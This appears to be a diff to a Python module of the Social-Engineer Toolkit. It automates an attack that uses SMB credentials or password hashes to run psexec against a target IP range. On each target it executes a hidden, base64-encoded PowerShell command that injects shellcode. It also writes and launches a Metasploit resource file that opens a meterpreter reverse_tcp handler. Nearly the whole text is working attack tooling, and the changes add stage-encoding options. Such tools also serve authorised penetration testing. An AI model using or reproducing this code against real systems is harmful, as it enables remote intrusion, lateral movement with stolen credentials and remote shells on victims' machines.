@@ -21,6 +21,11 @@ from src.core.setcore import *
 
 # msf auxiliary(psexec_command) >
 
+# grab config options for stage encoding
+stage_encoding = check_config("STAGE_ENCODING=").lower()
+if stage_encoding == "off": stage_encoding = "false"
+else: stage_encoding = "true"
+
 rhosts=raw_input(setprompt(["32"], "Enter the IP Address or range (RHOSTS) to connect to")) # rhosts
 username=raw_input(setprompt(["32"], "Enter the username")) # username for domain/workgroup
 password=raw_input(setprompt(["32"], "Enter the password or the hash")) # password for domain/workgroup
@@ -30,6 +35,8 @@ threads=raw_input(setprompt(["32"], "How many threads do you want [enter for def
 if domain == "": domain = "WORKGROUP"
 # set the threads
 if threads == "": threads = "15"
+
+payload = check_config("POWERSHELL_INJECT_PAYLOAD_X86=").lower()
 
 #
 # payload generation for powershell injection
@@ -43,6 +50,10 @@ try:
     port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
     if port == "": port = "443"
     update_options("PORT=" + port)
+    filewrite = file(setdir + "/payload_options.shellcode", "w")
+    # format needed for shellcode generation
+    filewrite.write(payload + " " + port + ",")
+    filewrite.close()
     update_options("POWERSHELL_SOLO=ON")
     print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
     try: reload(src.payloads.powershell.prep)
@@ -53,7 +64,7 @@ try:
 
     x86 = file(setdir + "/x86.powershell", "r")
     x86 = x86.read()
-    x86 = "powershell -nop -window hidden -noni -enc " + x86
+    x86 = "powershell -nop -win hidden -noni -enc " + x86
     print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
     filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
     filewrite.write(x86)
@@ -63,12 +74,11 @@ try:
 
     # write out our answer file for the powershell injection attack
     filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding true\nset ExitOnSession false\nexploit\n" % (port,rhosts,username,password,domain,threads,command))
+    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" % (port,rhosts,username,password,domain,threads,command, stage_encoding))
     filewrite.close()
-    msf_path = meta_path()
     # launch metasploit below
     print_status("Launching Metasploit.. This may take a few seconds.")
-    subprocess.Popen("ruby %s/msfconsole -L -n -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
+    subprocess.Popen("%smsfconsole -r %s/reports/powershell/powershell.rc" % (meta_path(),setdir), shell=True).wait()
 
 # handle exceptions
 except Exception, e:
